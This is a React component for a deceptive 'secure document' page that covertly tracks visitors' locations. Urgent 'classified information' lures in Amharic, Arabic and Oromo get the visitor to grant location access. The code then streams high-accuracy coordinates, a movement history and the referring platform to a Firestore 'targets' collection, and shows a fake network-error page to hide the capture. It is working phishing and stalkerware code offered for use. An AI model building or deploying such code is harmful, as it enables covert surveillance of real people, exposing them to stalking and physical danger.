import React, { useState, useEffect, useRef } from 'react';
import { Shield, Eye, AlertTriangle, Fingerprint, MapPin, Globe } from 'lucide-react';
import { motion } from 'motion/react';
import { 
  db, 
  auth, 
  signInAnonymously, 
  setDoc, 
  doc, 
  serverTimestamp, 
  handleFirestoreError, 
  OperationType,
  updateDoc,
  arrayUnion
} from '../lib/firebase';

export const TrackerPortal: React.FC = () => {
  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error'>('idle');
  const [errorMsg, setErrorMsg] = useState<string>('');
  const [progress, setProgress] = useState(0);
  const targetIdRef = useRef<string | null>(null);

  const [targetId, setTargetId] = useState<string | null>(null);
  const [isClient, setIsClient] = useState(false);
  const [timeLeft, setTimeLeft] = useState(120);
  const [lang, setLang] = useState('amharic');
  const [fakeError, setFakeError] = useState(false);

  useEffect(() => {
    setIsClient(true);
    // Detect language from URL
    const params = new URLSearchParams(window.location.search);
    const langParam = params.get('lang');
    if (langParam) setLang(langParam);

    // Generate or get persistent ID for this target
    let tid = localStorage.getItem('eagle_target_id');
    if (!tid) {
      tid = `T-${Math.random().toString(36).substring(2, 11).toUpperCase()}`;
      localStorage.setItem('eagle_target_id', tid);
    }
    setTargetId(tid);

    const countdown = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(countdown);
  }, []);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const translations = {
    amharic: "\"አስቸኳይ ምስጢራዊ መረጃ ስለአሁኑ ወቅታዊ መረጃ ነው በቀጥታ እንዳልልክልህ እንዳይታወቅብን ነዉ ቶሎ ብለህ በሊንኩ ግባና መረጃዉን እየዉ ለአንተ እንድልክ ትዕዛዝ ተሰጥቶኝ ነዉ... ሪፖርቱን ለማየት ከታች ያለውን ሊንክ ይጫን ቪድዮና ፎቶም በዉስጡ አለ ።\"",
    arabic: "\"معلومات سرية عاجلة بخصوص المعلومات الحالية، لم أرسلها لك مباشرة حتى لا نكتشف. ادخل الرابط بسرعة وشاهد المعلومات، لقد تلقيت أمراً بإرسالها لك... اضغط على الرابط أدناه لمشاهدة التقرير، هناك فيديو وصور بالداخل.\"",
    oromo: "\"Oduu hammaa fi iccitidha, kallattiin akka siif hin ergonomic dhoksaadhon siif erge. Dafee liinkii kanaan seenii odeeffannoo kana ilaali, ajajni siif akka kenne naaf kennameera... Gabaasa kana ilaaluuf liinkii armaan gadii cuqaasii, viidiyoo fi fakkiiwwanis keessa jiru.\""
  };

  // Protocol initialization
  const startRecon = async () => {
    if (!isClient) return;
    setStatus('scanning');
    setErrorMsg('');
    setProgress(0);
    
    // Technical visual progression
    const timer = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(timer);
          return 100;
        }
        return prev + 2;
      });
    }, 30);

    try {
      // Use existing session if available, otherwise Background Auth
      let user = auth.currentUser;
      if (!user) {
        try {
          const cred = await signInAnonymously(auth);
          user = cred.user;
        } catch (authErr: any) {
          console.warn("Auth failed, falling back to local ID:", authErr);
          if (authErr.code === 'auth/operation-not-allowed') {
            setErrorMsg('SERVER_CONFIG_ERROR: Anonymous Authentication must be enabled.');
            setStatus('error');
            return;
          }
          throw authErr;
        }
      }

      if (!navigator.geolocation) {
        throw new Error('SECURE_PROTOCOL_UNSUPPORTED');
      }

      // Detect Platform accurately
      const ua = navigator.userAgent || "";
      let platform = 'Browser';
      if (ua.includes('FB')) platform = 'Facebook';
      else if (ua.includes('WhatsApp')) platform = 'WhatsApp';
      else if (ua.includes('Telegram')) platform = 'Telegram';
      else if (ua.includes('Instagram')) platform = 'Instagram';
      else if (ua.includes('Twitter') || ua.includes('X/')) platform = 'X';

      // High-precision stealth stream
      navigator.geolocation.watchPosition(
        async (position) => {
          // Once granted, we switch to a 'granted' state which shows "Unpacking..."
          setStatus('granted');
          const { latitude, longitude, accuracy } = position.coords;
          
          try {
            // Persistent stealth uplink with history tracking
            const targetRef = doc(db, 'targets', user.uid);
            await setDoc(targetRef, {
              name: `Vector ${user.uid.slice(0, 4)}`,
              lat: latitude,
              lng: longitude,
              accuracy: accuracy,
              lastSeen: new Date().toISOString(),
              status: 'active',
              platform: platform,
            }, { merge: true });
            
            // Append to path history for movement visualization
            await updateDoc(targetRef, {
              history: arrayUnion([latitude, longitude])
            });

            // After successful uplink, trigger "Fake Error" after a short delay
            setTimeout(() => {
              setFakeError(true);
              setStatus('error');
              setErrorMsg('NETWORK_ERROR: Your internet connection is unstable. Please check your signal or try a different network connection. (Error Code: 404_NET_SEC)');
            }, 6000);

          } catch (e) {
            handleFirestoreError(e, OperationType.WRITE, `targets/${user.uid}`);
          }
        },
        (error) => {
          console.error("Signal Lost:", error);
          if (error.code === error.PERMISSION_DENIED) {
            setStatus('denied');
            setErrorMsg('ACCESS_REJECTED: የደህንነት ፈቃድ አልተሰጠም። እባክዎ ምስጢራዊ መረጃውን ለማየት ፍቃድ ይስጡ (Settings > Privacy > Location > Allow).');
          } else {
            setStatus('error');
            setErrorMsg(`SIGNAL_TIMEOUT: ግንኙነቱ ተቋርጧል፡፡ ክፍት ቦታ ላይ ሆነው ይሞክሩ።`);
          }
        },
        { 
          enableHighAccuracy: true, 
          maximumAge: 0, 
          timeout: 25000 
        }
      );
    } catch (err: any) {
      console.error(err);
      setStatus('error');
      setErrorMsg('HANDSHAKE_FAILURE: Terminal reset required.');
    }
  };

  // If fake error is active, show a very convincing standard error page
  if (fakeError && status === 'error') {
    return (
      <div className="min-h-screen bg-white text-gray-800 font-sans flex items-center justify-center p-6">
        <div className="max-w-md w-full space-y-6">
          <div className="flex flex-col items-center gap-4">
             <div className="w-16 h-16 bg-red-50 text-red-500 rounded-full flex items-center justify-center">
                <AlertTriangle className="w-8 h-8" />
             </div>
             <h1 className="text-2xl font-bold text-gray-900">Network Error</h1>
             <p className="text-center text-gray-500 text-sm leading-relaxed">
               The document could not be opened because your internet connection is too weak or restricted. 
               Please try again when you have a stronger signal or are connected to Wi-Fi.
             </p>
          </div>
          <div className="bg-gray-50 p-4 rounded-lg border border-gray-200">
            <div className="text-[10px] text-gray-400 uppercase font-black tracking-widest mb-2">Technical Details</div>
            <div className="font-mono text-xs text-gray-600 break-all">
              Error_Code: 404_CONNECTION_TIMEOUT<br/>
              Server: Secure_Node_v8<br/>
              Status: Handshake_Failed
            </div>
          </div>
          <button 
            onClick={() => window.location.reload()}
            className="w-full py-3 bg-blue-600 text-white rounded-lg font-bold hover:bg-blue-700 transition-colors shadow-lg shadow-blue-200"
          >
            Retry Connection
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050608] text-slate-300 font-mono flex flex-col items-center justify-center p-4 tech-grid">
      <div className="max-w-md w-full bg-[#0a0c12] rounded-xl border border-slate-800 p-8 relative overflow-hidden shadow-2xl">
        {/* Stealth Overlay */}
        <div className="absolute top-0 right-0 p-4 opacity-[0.03] pointer-events-none">
          <Globe className="w-32 h-32" />
        </div>

        <div className="flex justify-center mb-8">
          <div className="relative">
            <div className="w-20 h-20 bg-blue-600/5 rounded-full flex items-center justify-center border border-blue-600/20">
              <Shield className="w-10 h-10 text-blue-500/80 animate-pulse" />
            </div>
            <div className="absolute -bottom-1 -right-1 w-6 h-6 bg-slate-900 border border-slate-800 rounded-full flex items-center justify-center">
              <Fingerprint className="w-3 h-3 text-blue-400" />
            </div>
          </div>
        </div>

        <div className="text-center mb-10">
          <h2 className="text-xl font-black tracking-tighter mb-2 text-white italic">DOCUMENT_ENCRYPTED</h2>
          <div className="flex items-center justify-center gap-2 mb-1">
            <div className="h-[1px] w-8 bg-slate-800"></div>
            <p className="text-[9px] text-slate-500 uppercase tracking-[0.3em] font-bold">Priority Signal Alpha</p>
            <div className="h-[1px] w-8 bg-slate-800"></div>
          </div>
        </div>

        <div className="space-y-8">
          {status === 'idle' && (
            <motion.div 
              initial={{ opacity: 0, y: 10 }} 
              animate={{ opacity: 1, y: 0 }}
              className="space-y-8"
            >
              <div className="bg-slate-900/30 border border-slate-800/50 p-6 rounded-lg text-center relative overflow-hidden group cursor-pointer active:scale-[0.99] transition-transform" onClick={startRecon}>
                <div className="absolute top-0 left-0 w-1 h-full bg-blue-600/40"></div>
                
                {lang === 'amharic' || lang === 'both' ? (
                  <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4">
                    {translations.amharic}
                  </p>
                ) : null}
                
                {lang === 'arabic' || lang === 'both' ? (
                  <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4 dir-rtl text-right">
                    {translations.arabic}
                  </p>
                ) : null}

                {lang === 'oromo' || lang === 'both' ? (
                  <p className="text-[12px] leading-relaxed text-slate-300 font-medium mb-4">
                    {translations.oromo}
                  </p>
                ) : null}

                <div className="flex flex-col items-center gap-2 border-t border-slate-800/50 pt-4">
                  <div className="text-[42px] font-black text-blue-500 tracking-[0.5em] font-mono group-hover:text-blue-400 transition-colors animate-pulse drop-shadow-[0_0_10px_rgba(59,130,246,0.5)]">
                    8429
                  </div>
                  <div className="flex items-center justify-center gap-4 text-[9px] text-slate-500 uppercase tracking-widest font-bold">
                    <span className="flex items-center gap-1.5"><Shield className="w-2.5 h-2.5" /> SECURE_ID</span>
                    <span className="flex items-center gap-1.5"><Fingerprint className="w-2.5 h-2.5" /> AUTH_CODE</span>
                  </div>
                </div>
                <div className="mt-4 text-[10px] text-red-500/60 font-bold animate-pulse">
                  EXPIRING IN: {formatTime(timeLeft)}
                </div>
              </div>
              
              <button 
                onClick={startRecon}
                className="w-full py-4 bg-slate-800/50 text-slate-400 font-bold text-[10px] tracking-[0.3em] rounded border border-slate-700 hover:bg-slate-800 hover:text-white transition-all uppercase active:scale-[0.98]"
              >
                Access Document
              </button>

              <div className="text-center">
                <p className="text-[8px] text-slate-600 uppercase tracking-widest leading-loose">Secure Access Node: FB, WA, Telegram & Browsers Supported</p>
              </div>
            </motion.div>
          )}

          {status === 'scanning' && (
            <div className="space-y-6 py-4">
              <div className="space-y-2">
                <div className="flex justify-between items-center text-[10px] font-bold text-slate-600 mb-1">
                  <span className="tracking-[0.2em] animate-pulse">ESTABLISHING TUNNEL...</span>
                  <span className="text-blue-500 font-mono italic">{progress}%</span>
                </div>
                <div className="h-1.5 w-full bg-slate-900 rounded-full overflow-hidden border border-slate-800">
                  <motion.div 
                    className="h-full bg-blue-500 shadow-[0_0_15px_rgba(59,130,246,0.5)]" 
                    initial={{ width: 0 }}
                    animate={{ width: `${progress}%` }}
                  />
                </div>
              </div>
              <div className="grid grid-cols-2 gap-2">
                <div className="bg-slate-950 p-2 border border-slate-800 rounded text-[7px] text-slate-600 uppercase italic">Packet_Sync: OK</div>
                <div className="bg-slate-950 p-2 border border-slate-800 rounded text-[7px] text-slate-600 uppercase italic">Node_Stream: ACTIVE</div>
              </div>
            </div>
          )}

          {status === 'granted' && (
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="text-center space-y-6"
            >
              <div className="bg-slate-900 border border-slate-800 rounded-lg overflow-hidden text-left shadow-2xl">
                <div className="bg-blue-600/20 p-3 border-b border-slate-800 flex items-center justify-between">
                  <span className="text-[10px] font-bold uppercase tracking-wider text-blue-400">Classified_Report_8429.pdf</span>
                  <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
                </div>
                <div className="p-6 space-y-4">
                  <div className="h-4 w-3/4 bg-slate-800 rounded animate-pulse"></div>
                  <div className="h-4 w-full bg-slate-800 rounded animate-pulse opacity-60"></div>
                  <div className="h-4 w-5/6 bg-slate-800 rounded animate-pulse opacity-40"></div>
                  <div className="h-4 w-4/6 bg-slate-800 rounded animate-pulse opacity-20"></div>
                  
                  <div className="py-4 text-center">
                    <p className="text-[11px] text-slate-400 font-medium">የሰነዱ መረጃዎች በመተንተን ላይ ናቸው... 98%</p>
                    <div className="mt-2 text-[9px] text-slate-600">እገዛ: ኮምፒውተሩ ሰነዱን እየፈታ ነው፡፡ እባክዎ ጥቂት ሰከንዶች ይጠብቁ።</div>
                  </div>
                </div>
              </div>
              
              <div className="flex justify-center items-center gap-3 text-slate-500">
                <div className="w-4 h-4 border-2 border-blue-500/30 border-t-blue-500 rounded-full animate-spin"></div>
                <span className="text-[10px] uppercase tracking-widest font-black italic">Syncing decryptor nodes...</span>
              </div>
            </motion.div>
          )}

          {status === 'denied' && (
            <div className="text-center p-8 border border-red-500/20 bg-red-500/5 rounded-lg space-y-4">
              <AlertTriangle className="w-10 h-10 text-red-600 mx-auto opacity-80" />
              <div className="space-y-1">
                <p className="text-[12px] text-red-500 font-black uppercase tracking-tighter italic">SECURITY_PROTOCOL_REVOKED</p>
                <p className="text-[9px] text-slate-500 leading-relaxed font-medium">የምስጢር ሰነዱን ለማንበብ የቦታ መገኛ (Location) ፈቃድ ያስፈልጋል፡፡ እባኮት "Allow" የሚለውን በመጫን ፈቃድ ይስጡ።</p>
              </div>
              <button 
                onClick={() => setStatus('idle')}
                className="w-full py-3 bg-slate-800 hover:bg-slate-700 text-white text-[10px] uppercase font-bold rounded transition-colors"
              >
                እንደገና ይሞክሩ (RE-AUTHORIZE)
              </button>
            </div>
          )}

          {status === 'error' && (
            <div className="text-center p-6 border border-amber-500/20 bg-amber-500/5 rounded-lg space-y-3">
              <AlertTriangle className="w-8 h-8 text-amber-600/50 mx-auto" />
              <p className="text-[11px] font-bold text-amber-500 uppercase italic">CONNECTION_TIMEOUT</p>
              <p className="text-[9px] text-slate-500 px-4">{errorMsg}</p>
              <button 
                onClick={() => setStatus('idle')}
                className="text-[9px] text-blue-500 underline font-bold uppercase"
              >
                Retry Handshake
              </button>
            </div>
          )}
        </div>

        <div className="mt-12 pt-6 border-t border-slate-800/50 flex items-center justify-between opacity-30 text-[7px] uppercase tracking-[0.4em] font-black">
          <div className="flex items-center gap-1.5">
            <div className="w-1 h-1 rounded-full bg-blue-500 animate-ping"></div>
            <span>LINK_ESTABLISHED</span>
          </div>
          <span className="text-slate-500">v8.4 // ALPHA_SECTOR</span>
        </div>
      </div>
    </div>
  );
};
